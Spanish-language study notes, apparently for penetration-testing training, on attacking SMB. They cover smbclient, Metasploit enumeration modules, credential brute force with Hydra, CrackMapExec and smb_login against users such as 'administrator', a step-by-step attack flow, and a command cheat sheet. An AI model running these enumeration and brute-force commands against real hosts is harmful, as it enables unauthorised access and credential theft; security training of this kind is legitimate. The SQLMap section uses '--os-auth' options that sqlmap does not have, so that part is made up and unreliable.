# Apuntes: Protocolo SMB, uso de smbclient y Metasploit

## ¿Qué es SMB?
SMB (Server Message Block) es un protocolo de red que permite compartir archivos, impresoras y otros recursos entre máquinas, comúnmente en redes Windows.

### Puerto utilizado
- **TCP 445**

### Usos comunes
- Compartición de archivos e impresoras
- Autenticación de usuarios
- Comunicación entre servicios Windows

---

## Uso de smbclient (Herramienta de línea de comandos)

`smbclient` permite interactuar con recursos SMB desde la terminal, similar a un cliente FTP.

### Conexión a un recurso compartido
```
smbclient //IP/DIRECTORIO -U usuario
```

### Acceso anónimo
```
smbclient -L //IP -N
```

### Acciones comunes
- Ver recursos compartidos:
  ```
  smbclient -L //IP -U usuario
  ```
- Descargar archivos:
  ```
  get nombre_archivo
  ```
- Subir archivos:
  ```
  put nombre_archivo
  ```
- Navegar:
  ```
  ls
  cd nombre_directorio
  ```

---

## Enumeración SMB con Metasploit (msfconsole)

### 1. Buscar módulos SMB
```
search smb
```

### 2. Enumerar recursos compartidos
```
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS <IP>
run
```

### 3. Enumerar usuarios
```
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS <IP>
run
```

### 4. Enumerar sesiones activas
```
use auxiliary/scanner/smb/smb_enumsessions
set RHOSTS <IP>
run
```

### 5. Ver información del sistema
```
use auxiliary/scanner/smb/smb_version
set RHOSTS <IP>
run
```

---

## Fuerza bruta de credenciales SMB con Metasploit

```
use auxiliary/scanner/smb/smb_login
set RHOSTS <IP>
set USER_FILE /ruta/al/diccionario/usuarios.txt
set PASS_FILE /ruta/al/diccionario/contraseñas.txt
set STOP_ON_SUCCESS true
run
```

Parámetros:
- `USER_FILE`: diccionario de usuarios
- `PASS_FILE`: diccionario de contraseñas
- `STOP_ON_SUCCESS`: se detiene al encontrar credenciales válidas

---
---

# Targeting SMB (smbclient + brute force + enumeration)

## 1. Introducción
- **SMB (Server Message Block):** protocolo usado en Windows para compartir archivos, impresoras y otros recursos en red.
- **NetBIOS/SMB Enumeration:** puede revelar usuarios, recursos compartidos y credenciales débiles.
- Objetivo: **obtener acceso a shares SMB y explotar información sensible**.

---

## 2. Enumeración básica con Nmap
```bash
# Detectar puerto SMB (445)
nmap -p 445 --open -sV <IP>

# Scripts NSE de enumeración SMB
nmap --script smb-enum-users.nse -p 445 <IP>
nmap --script smb-enum-shares.nse -p 445 <IP>
nmap --script smb-os-discovery.nse -p 445 <IP>
```

---

## 3. Fuerza Bruta SMB

### Con Hydra
```bash
# Usando diccionario de usuarios y contraseñas
hydra -L users.txt -P passwords.txt smb://<IP>

# Contra un usuario en específico
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://<IP>
```

### Con CrackMapExec (CME)
```bash
# Fuerza bruta con diccionario
crackmapexec smb <IP> -u users.txt -p passwords.txt

# Contra un usuario en específico
crackmapexec smb <IP> -u administrator -p 'password'
```

### Con Metasploit
```bash
msfconsole
use auxiliary/scanner/smb/smb_login
set RHOSTS <IP>
set USER_FILE users.txt
set PASS_FILE passwords.txt
set THREADS 10
exploit
```

---

## 4. Acceso a recursos compartidos (shares)

### smbclient (con credenciales válidas)
```bash
# Conectarse a un recurso compartido
smbclient -U <usuario>%<password> //<IP>/<SHARE>

# Listar archivos
smb: \> ls

# Descargar archivo
smb: \> get file.txt

# Subir archivo
smb: \> put localfile.txt
```

### CrackMapExec – enumerar shares
```bash
# Listar shares accesibles para el usuario
crackmapexec smb <IP> -u <usuario> -p <password> --shares
```

---

## 5. SQLMap con SMB (abuso indirecto)
- En algunos entornos Windows, las credenciales SMB obtenidas también se usan para autenticación en bases de datos.
- Ejemplo: si encontramos credenciales en SMB, podemos probarlas con **SQLMap** en aplicaciones web que usen SQL Server.

```bash
# SQLMap con autenticación de Windows
sqlmap -u "http://<IP>/vulnerable.php?id=1" --dbms=mssql --os-auth --os-auth-user=<usuario> --os-auth-pass=<password>
```

---

## 6. Flujo típico de ataque SMB
1. **Descubrir servicio SMB activo:**
   ```bash
   nmap -p 445 -sV <IP>
   ```
2. **Enumerar usuarios/shares con Nmap o CME.**
3. **Realizar fuerza bruta con Hydra / CME / Metasploit.**
4. **Con credenciales válidas, conectarse con smbclient.**
5. **Enumerar qué shares son accesibles con CME.**
6. **Buscar información sensible (config files, credenciales, backups).**
7. **Probar credenciales también en otros servicios (SQL, RDP, WinRM).**

---

## 7. Resumen de Comandos Clave

```bash
# Fuerza bruta con Hydra
hydra -L users.txt -P passwords.txt smb://<IP>

# Fuerza bruta con CrackMapExec
crackmapexec smb <IP> -u users.txt -p passwords.txt

# Fuerza bruta con Metasploit
use auxiliary/scanner/smb/smb_login

# Conectarse a un share con smbclient
smbclient -U user%pass //<IP>/SHARE

# Ver shares con CME
crackmapexec smb <IP> -u user -p pass --shares

# SQLMap con credenciales SMB
sqlmap -u "http://<IP>/index.php?id=1" --dbms=mssql --os-auth --os-auth-user=user --os-auth-pass=pass
```
